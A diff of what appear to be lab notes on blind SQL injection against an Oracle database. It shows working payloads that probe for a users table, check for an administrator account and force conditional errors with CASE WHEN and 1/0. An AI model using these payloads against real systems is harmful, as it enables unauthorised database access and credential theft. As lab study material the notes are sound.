@@ -23,20 +23,12 @@ rA16s0b3PCRhyQB4' || (SELECT '' FROM DUAL) || ' --
 
 > We now want to check if there is a users table.
 ```
-rA16s0b3PCRhyQB4' AND (SELECT '' FROM users)='' --
-rA16s0b3PCRhyQB4' || (SELECT '' FROM users) || ' --
+rA16s0b3PCRhyQB4' AND (SELECT '' FROM users WHERE ROWNUM=1)='' --
+rA16s0b3PCRhyQB4' || (SELECT '' FROM users WHERE ROWNUM=1) || ' --
 ```
-> It works. If it hadn't worked, we shouldv'e tried adding `WHERE ROWNUM=1` so as not to break our query if the users table has more than 1 row. 
 > Cannot use the `LIMIT 1` syntax as it is not supported by oracle.
 
 > Now we check for the presence of the administrator user.
-```
-rA16s0b3PCRhyQB4' AND (SELECT username FROM users WHERE username='administrator' )='administrator' --
-
-rA16s0b3PCRhyQB4' || (SELECT username FROM users WHERE username='administrator' )|| ' --
-```
-> It works, so i tried checking for different usernames and they all worked. So i should try using conditional errors to check for the presence of the administrator.
-
 > For an easier expression, use string concatenation instead of equality checks.
 ```
 rA16s0b3PCRhyQB4' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || ' --
